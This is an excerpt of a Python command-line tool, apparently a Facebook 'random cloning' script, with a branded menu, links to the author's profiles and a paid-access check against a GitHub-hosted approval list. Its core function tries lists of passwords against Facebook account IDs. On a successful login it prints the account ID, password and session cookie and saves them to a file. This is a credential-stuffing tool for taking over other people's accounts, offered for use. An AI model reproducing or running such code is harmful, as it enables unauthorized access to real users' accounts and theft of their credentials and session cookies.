...
\033[1;37m------------------------------------------------
\033[1;37m Owner   :            NAYEM 
\033[1;37m Facebook:           NAYEM HASAN
...
def Main():
	os.system('clear')
	print(logo)
	print("[\033[1;37m01\33[1;92m][\033[1;93m1\33[1;92m] START RANDOM CLONING")
	print("[\033[1;37m02\33[1;92m][\033[1;93m2\33[1;92m] CONTACT ADMIN")
	# print("[\033[1;37m03\33[1;92m][\033[1;93m2\33[1;92m] FOLLOW MY FB PROFILE")
	print("[\033[1;37m04\33[1;92m][\033[1;93m3\33[1;92m] JOIN MESSENGER GROUP")
	print('[\033[1;37m00\33[1;92m][\033[1;93m4\33[1;92m] EXIT PROGRAMMING')
	print(54*'━')
	...
	if opt in ["B","2"]:
		admin()
	if opt in ["X","X"]:
		os.system('xdg-open https://www.facebook.com/profile.php?id=mdnayemhasan5258');time.sleep(1)
		fb()
	if opt in ["C","3"]:
		os.system('xdg-open https://m.me/j/AbZ-kzGKC1niOupz/');time.sleep(1)
		group()
	if opt in ["0","0"]:
		exit()
...
def admin():
	...
	if bal =='1':
		...
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/profile.php?id=100089948596624/');time.sleep(1)
		admin()
	if bal =='3':
		os.system('xdg-open https://github.com/NAYEM-590');time.sleep(1)
		admin()
	if bal =='0':
		Main()
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mNAYEM-😪\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [NAYEM-OK🔥] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m=[💉]=COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/NAYEM-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
...
def superuser():
    ...
    id = "5".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/NAYEM-BD/Bd-rendom/blob/main/Approve.txt").text
    if id in DARK:
        Main()
    else:
        os.system("clear")
        os.system("xdg-openhttps://www.facebook.com/mdnayemhasan5258")
        time.sleep(3.0)
        ...
        print ("\n")
        os.system("espeak \"assalamualaikum ,I am RH ROBOT and my boss is  NAYEM.Sir this tool is paid because 100% ok id just now login\"")
